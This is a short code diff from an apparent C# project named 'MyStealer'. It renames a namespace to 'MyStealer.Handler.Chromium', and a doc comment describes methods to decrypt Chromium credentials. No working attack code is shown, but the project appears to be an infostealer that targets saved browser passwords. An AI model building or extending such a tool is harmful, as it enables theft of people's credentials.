@@ -5,7 +5,7 @@ using System.Text;
 using System.Linq;
 using Serilog;
 
-namespace MyStealer.Decryptor
+namespace MyStealer.Handler.Chromium
 {
     /// <summary>
     /// Provides methods to decrypt Chromium credentials.
